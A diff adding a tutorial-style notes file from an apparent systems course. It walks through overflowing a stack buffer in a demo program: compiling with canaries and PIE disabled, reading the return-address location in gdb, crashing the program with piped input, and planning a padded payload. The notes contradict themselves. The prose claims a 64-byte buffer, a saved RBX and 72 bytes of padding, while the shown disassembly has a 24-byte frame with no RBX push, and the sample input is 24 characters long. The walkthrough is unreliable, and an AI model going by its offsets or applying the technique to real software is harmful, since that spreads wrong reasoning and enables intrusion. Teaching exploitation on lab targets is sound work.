@@ -1,0 +1,58 @@
+first, type "make" to compile bufdemo.c with the right flags, in particular
+-fno-stack-protector -- disables stack canaries
+-no-pie              -- disables ASLR by not generating position-independent-code
+
+Lets determine the stack layout with objdump -d and looking at the disassembly
+of echo, apart from the obvious 64 bytes for the array, it also backs up 
+the callee save RBX register on the stack, hence we get, before the call
+of gets the following stack layout:
+
+       |-------
+       |  Ret addr  (8 bytes)
+       |-------
+       |  Old RBX   (8 bytes) 
+       |-------
+       |  buf       (64 bytes)
+rsp -> |-------
+
+hence we need an input string with 72 bytes of padding, followed by the 
+8 byte address of the exploit.
+
+gdb bufdemo
+(gdb) break echo
+Breakpoint 1 at 0x40068d: file bufdemo.c, line 17.
+(gdb) run 
+Starting program: /media/donna/git/casp/fall2014/source_examples/chapter10/bufdemo 
+
+Breakpoint 1, echo () at bufdemo.c:17
+17	void echo() {
+
+(gdb) disass echo
+Dump of assembler code for function echo:
+   0x000000000040068d <+0>:	sub    $0x18,%rsp
+=> 0x0000000000400691 <+4>:	mov    %rsp,%rdi
+   0x0000000000400694 <+7>:	callq  0x400530 <gets@plt>
+   0x0000000000400699 <+12>:	mov    %rsp,%rdi
+   0x000000000040069c <+15>:	callq  0x4004f0 <puts@plt>
+   0x00000000004006a1 <+20>:	add    $0x18,%rsp
+   0x00000000004006a5 <+24>:	retq   
+End of assembler dump.
+(gdb) print /x $rsp
+$7 = 0x7fffffffe210
+(gdb) print /x *(unsigned long *)($rsp + 0x18)   <-- Guess where the return address is
+$4 = 0x4006c3                                    <-- Yep, looks like an address.
+(gdb) print /x &buf
+$6 = 0x7fffffffe210                              <-- buf == $rsp
+
+echo $'123456789012345678901234ADDRESS' | ./bufdemo   <-- this will happily crash the program
+
+How do we figure out the exploit address? Since we disabled the ASLR we can
+statically figure out the address from the binaries symbol table
+
+> objdump -t bufdemo | grep some
+
+So all we need to do is to write 72 byte followed by one of these addresses,
+the create the binary payload you can use a hex editor, the provided tool
+hex2raw, a custom script or even a C program. We have chosen to write
+a little python script, gen_exploit. It should be understandable even by
+non python experts.
